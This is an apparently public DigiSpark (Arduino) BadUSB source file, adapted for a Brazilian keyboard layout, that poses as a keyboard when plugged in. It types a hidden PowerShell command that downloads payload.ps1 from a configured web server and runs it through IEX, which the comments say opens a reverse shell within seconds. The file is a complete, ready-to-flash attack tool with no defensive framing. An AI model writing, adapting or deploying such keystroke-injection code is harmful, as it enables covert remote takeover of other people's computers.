// This script downloads and executes a powershell script efectively opening up a reverse shell in less than 3 seconds. 
// Credits to hak5 and samratashok (developer of the nishang framework).
/*
 * Script originally made by https://github.com/CedArctic/DigiSpark-Scripts/tree/master/Reverse_Shell
 * All I did was mapping the needed special keys so that it worked with a brazillian ABNT keyboard.
 * This script works without modifying 'scancode-ascii-table.h', just compile and upload !
 */
#include "DigiKeyboard.h"
#define BARRA_DIREITA 84
#define BARRA_ESQUERDA 100 
#define PONTO_VIRGULA 56
#define RSHIFT 0xA0
#define ASPAS 53

/* 
* Config:
* IP = the webserver's IP.
* filename = the path after the ip e.g. if the entire URL is http://192.168.0.119/payload.ps1, the filename is "payload.ps1"
*/
char IP[] = "192.168.0.119";
char filename[] = "payload.ps1";
void setup() {
  
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -windowstyle hidden ");
  DigiKeyboard.sendKeyStroke(ASPAS,RSHIFT);
  DigiKeyboard.print("IEX (New-Object Net.WebClient).DownloadString(");
  DigiKeyboard.sendKeyStroke(ASPAS,0);
  DigiKeyboard.print("http");
  DigiKeyboard.sendKeyStroke(PONTO_VIRGULA,RSHIFT);
  DigiKeyboard.sendKeyStroke(BARRA_DIREITA,0);
  DigiKeyboard.sendKeyStroke(BARRA_DIREITA,0);
  DigiKeyboard.print(IP);
  DigiKeyboard.sendKeyStroke(BARRA_DIREITA,0);
  DigiKeyboard.print(filename);
  DigiKeyboard.sendKeyStroke(ASPAS,0);
  DigiKeyboard.print(")");
  DigiKeyboard.sendKeyStroke(PONTO_VIRGULA,0);
  DigiKeyboard.sendKeyStroke(ASPAS,RSHIFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*Stops the digispark from running the script again*/
  }
}
